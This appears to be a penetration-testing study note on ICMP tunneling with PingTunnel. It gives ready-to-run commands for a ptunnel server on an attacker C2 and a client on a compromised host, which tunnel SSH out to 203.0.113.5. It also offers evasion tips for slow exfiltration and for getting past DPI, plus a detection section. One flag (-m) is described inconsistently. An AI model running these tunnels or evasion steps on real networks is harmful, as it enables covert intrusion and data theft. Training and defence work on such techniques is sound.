---
topic: "73.08 ICMP Tunneling PingTunnel"
date: 2026-06-09
author: 'Antigravity'
tags: [network, advanced, pivoting, evasion, vapt]
difficulty: advanced
module: "73 - Advanced Network Pivoting Tunnels and Evasion"
---

# 73.08 ICMP Tunneling PingTunnel

## 1. Introduction to ICMP Tunneling
When performing Advanced Network Pivoting, you will inevitably encounter networks where strict egress filtering blocks all outbound TCP and UDP connections. Administrators often configure firewalls to block protocols like HTTP, DNS, and SSH to unknown external addresses.
However, ICMP (Internet Control Message Protocol) is frequently overlooked. Because ICMP `Echo Request` (Type 8) and `Echo Reply` (Type 0) packets are essential for network diagnostics (ping), firewalls often permit outbound ICMP traffic to the internet.
**ICMP Tunneling** exploits this oversight by encapsulating arbitrary data (like a TCP connection) inside the payload section of ICMP echo packets. `PingTunnel` (or `ptunnel`) is a legendary utility designed specifically for this purpose, allowing an attacker to reliably tunnel TCP connections to a remote host using ICMP echo requests and replies.

## 2. Protocol Mechanics
### 2.1 The ICMP Payload
A standard ICMP Echo Request contains an IP header, an ICMP header, and an optional data payload. While normal ping utilities send a small payload (like the alphabet or timestamps) to verify data integrity upon return, there is no strict protocol limit on what the data can be, up to the Maximum Transmission Unit (MTU) of the network link (typically ~1500 bytes).
An ICMP Tunneling client reads a local TCP socket, chunks the TCP data, and stuffs it into the data field of an ICMP Type 8 packet. The server receives the ICMP packet, extracts the payload, and forwards it to the actual TCP destination.

## 3. ASCII Diagram: PingTunnel Architecture

```text
      [ Target Application ] (e.g., SSH, RDP)
      IP: 10.0.0.5 Port: 22
             ^
             | (Unencrypted TCP)
             |
    +----------------------------------+
    | Compromised Host (Client)        |
    | Running: ptunnel -p <Server_IP>  |
    +----------------------------------+
             |
             |  [ FW blocks TCP outbound ]
             |  [ FW allows ICMP outbound ]
             |
             |  (TCP wrapped in ICMP Type 8 / Type 0)
             v
    +----------------------------------+
    | Attacker C2 (Server)             |
    | Running: ptunnel                 |
    | Receives ICMP, unwraps to TCP    |
    +----------------------------------+
             |
             | (Unencrypted TCP)
             v
      [ Attacker Local Console ]
      Listening on Localport (e.g. 8000)
```

## 4. Deep Dive: Setting up PingTunnel (ptunnel)

### 4.1 Server Setup (Attacker C2)
The attacker C2 must act as the `ptunnel` server. It must be accessible via public IP, and the host OS must not intercept the ICMP packets before `ptunnel` can process them.
To prevent the Linux kernel from automatically replying to pings (which confuses ptunnel), disable ICMP replies:
```bash
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
```
Then, start the ptunnel server daemon (requires root privileges to sniff raw sockets):
```bash
sudo ptunnel -c <network_interface> -x <password>
# Example:
sudo ptunnel -c eth0 -x securepass123
```

### 4.2 Client Setup (Compromised Host)
Deploy the statically compiled `ptunnel` binary to the compromised host. The client will map a local port and tunnel it to the attacker's server.
```bash
# ptunnel -p <ptunnel_server_ip> -lp <local_port> -da <destination_ip> -dp <destination_port> -x <password>
sudo ./ptunnel -p 203.0.113.5 -lp 8000 -da 127.0.0.1 -dp 22 -x securepass123
```
*In this command, connecting to `localhost:8000` on the compromised host will tunnel the traffic via ICMP to `203.0.113.5`, which then forwards the connection back to the attacker's local SSH daemon (or vice-versa).*

### 4.3 Establishing the Shell
If you tunneled an SSH connection, you simply connect locally:
```bash
ssh -p 8000 user@127.0.0.1
```
The SSH traffic is chunked, wrapped in ping requests, sent to the C2, unwrapped, and processed as a normal SSH session.

## 5. Advanced Configuration & Tuning

### 5.1 Handling MTU and Fragmentation
ICMP packets larger than the network MTU will be fragmented at the IP layer. Heavy fragmentation severely degrades tunneling performance and drastically increases the chance of packet loss or IDS detection.
You must carefully tune the `ptunnel` MTU or the TCP window size to prevent fragmentation.
```bash
# Limit unprivileged ping sizes
sudo ptunnel -m 1000 -x securepass123
```

### 5.2 Dealing with NAT
Standard ICMP has no concept of "ports". Therefore, NAT appliances track ICMP sessions using the `Identifier` field in the ICMP header. If the NAT translation is aggressive or state-timeouts are short, the tunnel will drop constantly. `ptunnel` attempts to manage this by multiplexing connections over different ICMP sequence numbers, but highly stateful firewalls will still cause instability. Keepalive pings must be sent constantly.

## 6. Comprehensive Reference Checklist

### 6.1 PingTunnel Flag Reference
- `-p <ip>`: IP address of the `ptunnel` proxy/server.
- `-lp <port>`: Local port to listen on for incoming TCP connections.
- `-da <ip>`: Destination address the proxy should forward the unwrapped TCP connection to.
- `-dp <port>`: Destination port.
- `-m <int>`: Max number of concurrent tunnels (server side).
- `-x <password>`: Authentication password to prevent unauthorized use of your relay.
- `-u`: Run unprivileged (relies on UDP ping instead of raw sockets, often blocked).

## 7. Evasion and OpSec
- **Traffic Volume**: Tunneling a high-bandwidth protocol (like RDP or SMB) over ICMP will generate thousands of ping packets per second. This is an immediate and glaring anomaly in any environment. Use ICMP tunneling exclusively for low-bandwidth, interactive shells (like SSH) or slow data exfiltration.
- **Payload Inspection**: Advanced firewalls (like Palo Alto or Fortinet) inspect the payload of ICMP packets. If the payload does not match the standard Windows/Linux ping sequence, the packet is dropped.
- To bypass DPI, consider modern implementations like `ptunnel-ng` which offer obfuscation or padding to make the payload appear like legitimate ping data.

## 8. Detection and Mitigation

### 8.1 Network Level Detection
- **High ICMP Volume**: Monitor for unusually high frequencies of ICMP traffic originating from a single host. Normal ping activity is 1 packet per second for brief intervals.
- **Large ICMP Packets**: Standard pings are 32 or 64 bytes. Tunnels use payloads of 500-1500 bytes. Alert on ICMP packets exceeding 100 bytes.
- **Asymmetric Traffic**: Monitor for mismatched payloads. Standard ICMP dictates that the Echo Reply payload matches the Echo Request payload exactly. Tunnels send different data back and forth.

### 8.2 Host Level Detection
- Execution of unknown binaries requiring `CAP_NET_RAW` capabilities or root privileges.
- Processes communicating exclusively via raw sockets without opening standard TCP/UDP ports.

## 9. Chaining Opportunities
- **ICMP to SSH to SOCKS**: Use `ptunnel` to establish a stable SSH connection out of a restricted network, then use SSH dynamic port forwarding (`-D`) to create a SOCKS proxy, effectively routing proxychains traffic entirely over ICMP.
- **DNS/ICMP Hybrid**: If ICMP is blocked, fallback to DNS tunneling (`iodine`). Having both configured ensures persistence if one protocol is restricted during the engagement.

## 10. Related Notes
- [[09 - DNS Tunneling Iodine dnscat2]]
- [[10 - Bypassing Firewalls via Egress Testing]]
- [[12 - SSH Dynamic Port Forwarding]]
- [[07 - Socat Relays and Bind Shells]]
